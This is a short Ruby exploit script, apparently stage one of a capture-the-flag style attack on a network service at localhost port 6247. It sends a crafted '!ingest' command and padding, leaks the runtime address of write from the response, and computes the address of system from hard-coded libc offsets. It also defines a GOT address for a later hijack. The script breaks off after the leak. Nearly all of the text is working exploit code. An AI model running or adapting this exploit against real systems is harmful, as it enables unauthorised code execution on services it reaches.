require 'socket'
require 'pry'

sysoffset = 0x40100
writeoffset = 0xdb530
offset = writeoffset-sysoffset
writeaddr = 0x08051140
got = 0x8050ff8

host = "localhost"
port = 6247

s = TCPSocket.open(host, port)

#-------- Stage 1 ----------
puts "[*] Sending Stage1 payload"
s.write("!ingest localhost/stage1\n")
s.write("A B C ")
sleep(0.2)
a = s.recv(9999)
# take the last 4 characters that we leaked
m = a.split(//).last(4).join("").to_s
n = m.unpack("V")[0]
puts "[!] Leaked value of write 0x#{n.to_s(16)}"
sysaddr = n - offset
puts "[!] Leaked value of system 0x#{sysaddr.to_s(16)}"


